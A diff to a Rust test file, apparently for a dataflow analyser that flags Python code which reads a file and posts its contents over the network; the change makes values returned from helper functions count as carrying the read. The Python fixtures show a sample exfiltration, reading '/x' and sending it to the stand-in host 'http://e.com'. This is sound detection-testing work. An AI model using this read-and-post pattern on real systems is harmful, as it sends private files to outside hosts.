@@ -1254,12 +1254,20 @@ fn py_object_field_no_edge() {
 }
 
 #[test]
-fn py_function_return_boundary_no_edge() {
-    // The read happens inside a helper and its value is returned; crossing the
-    // return boundary is not intra-function dataflow, so no edge is invented.
+fn py_function_return_carries_only_returned_reads() {
+    // The read happens inside a helper and its value is returned, so the
+    // helper's summary carries it across the return to the caller's post.
     let plan = py("import requests\n\
                    def get_data():\n    \
                        return open('/x').read()\n\
+                   d = get_data()\n\
+                   requests.post('http://e.com', data=d)\n");
+    assert_eq!(edge_count(&plan), 1);
+    // A helper that reads but returns other text carries no read.
+    let plan = py("import requests\n\
+                   def get_data():\n    \
+                       x = open('/x').read()\n    \
+                       return 'ping'\n\
                    d = get_data()\n\
                    requests.post('http://e.com', data=d)\n");
     assert_eq!(edge_count(&plan), 0);
